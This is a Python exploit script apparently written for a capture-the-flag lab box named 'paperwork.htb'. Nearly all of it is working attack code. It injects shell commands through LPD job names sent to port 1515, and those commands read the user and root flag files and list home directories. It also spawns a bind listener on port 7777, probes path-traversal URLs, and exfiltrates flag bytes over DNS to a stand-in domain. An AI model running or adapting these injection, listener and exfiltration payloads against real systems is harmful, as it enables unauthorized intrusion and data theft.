import socket, time, urllib.request, sys

target = '10.129.248.117'

def lpd(job_name, timeout=8):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((target, 1515))
        s.send(b'\x02archive_intake')
        time.sleep(0.3)
        s.recv(1024)
        ct = (f'J{job_name}\n').encode()
        s.send(b'\x01' + str(len(ct)).encode() + b'\n' + ct)
        time.sleep(0.5)
        s.recv(4096)
        time.sleep(0.3)
        s.recv(4096)
    except socket.timeout:
        pass
    except Exception as e:
        pass
    s.close()

print("[1] Injecting flag read into archive.log...", flush=True)
job1 = "';F=$(cat /home/*/user.txt 2>/dev/null || echo NO_FLAG); echo \"FLAG_RESULT: $F\" >> /tmp/archive.log;'"
lpd(job1)

print("[2] Trying to read flag file directly with unique marker...", flush=True)
lpd("';cat /home/*/user.txt > /tmp/flag 2>/dev/null; chmod 644 /tmp/flag;'")
lpd("';cat /root/root.txt >> /tmp/flag 2>/dev/null;'")
lpd("';ls -la /home/ > /tmp/home_listing 2>/dev/null;'")

time.sleep(2)

print("[3] Checking for TCP server connectivity...", flush=True)
# Just test one port with both python flavors
lpd("';python3 -c \"import socket;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('',7777));s.listen(1)\" & #'")
time.sleep(0.5)
lpd("';python -c \"import socket;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('',7777));s.listen(1)\" & #'")
time.sleep(3)

s = socket.socket()
s.settimeout(3)
try:
    s.connect((target, 7777))
    print("[3a] PORT 7777: CONNECTED!", flush=True)
    s.close()
except (socket.timeout, ConnectionRefusedError) as e:
    print(f"[3a] PORT 7777: {type(e).__name__}", flush=True)
s.close()

print("[4] Testing web path traversal for tmp files...", flush=True)
urls = [
    '/tmp/flag', '/tmp/archive.log', '/tmp/home_listing',
    '/download/../../../tmp/flag',
    '/.%2e/.%2e/.%2e/tmp/flag',
]
for p in urls:
    req = urllib.request.Request(f'http://{target}{p}', headers={'Host': 'paperwork.htb'})
    try:
        resp = urllib.request.urlopen(req, timeout=5)
        data = resp.read().decode(errors='replace')[:300]
        print(f'[4] FOUND {p}: {resp.status} {data[:100]}', flush=True)
    except urllib.error.HTTPError as e:
        code = e.code
        if code != 404:
            print(f'[4] {p}: HTTP {code}', flush=True)
    except Exception as e:
        print(f'[4] {p}: {str(e)[:60]}', flush=True)

print("[5] Trying DNS exfil (nslookup)...", flush=True)
lpd("';nslookup $(cat /home/*/user.txt 2>/dev/null | head -c4 | xxd -p).exfil.test 2>/dev/null & #'")

print("[6] Checking queue state response...", flush=True)
s = socket.socket()
s.settimeout(5)
s.connect((target, 1515))
s.send(b'\x03archive_intake')
time.sleep(1)
try:
    data = s.recv(4096)
    print(f'[6] Queue state: {data}', flush=True)
except:
    print('[6] No queue state response', flush=True)
s.close()

print("DONE", flush=True)
